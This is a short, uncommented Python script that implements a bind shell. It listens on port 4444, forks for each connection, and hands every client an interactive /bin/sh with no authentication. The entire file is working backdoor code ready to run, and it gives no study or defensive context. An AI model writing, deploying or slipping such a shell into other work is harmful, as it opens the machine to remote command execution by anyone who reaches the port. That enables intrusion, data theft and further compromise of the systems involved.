import socket, os, subprocess, re, signal

def main():
  sock = socket.create_server((get_ip(), 4444))

  sock.listen()

  while(True):
    (conn, _) = sock.accept()

    print("Client connection from: " + conn.getsockname()[0])

    pid = os.fork()

    if(pid > 0):
      signal.signal(signal.SIGCHLD, signal.SIG_IGN)
    else:
      subprocess.Popen(["/bin/sh", "-i"], stdin=conn.fileno(), stdout=conn.fileno(), stderr=conn.fileno()).wait()

      try:
        conn.shutdown(socket.SHUT_RDWR)

        print("Client disconnection from: " + conn.getsockname()[0])
      except:
        print("Unexpected client disconnection from: " + conn.getsockname()[0])
      finally:
        break
    
def get_ip(): # Uses the first non-loopback IPv4 address
  return re.findall("inet (?P<addr>.*)/24 brd", subprocess.run(["ip", "addr"], capture_output=True).stdout.decode("utf-8"))[0]

if __name__ == '__main__':
  main()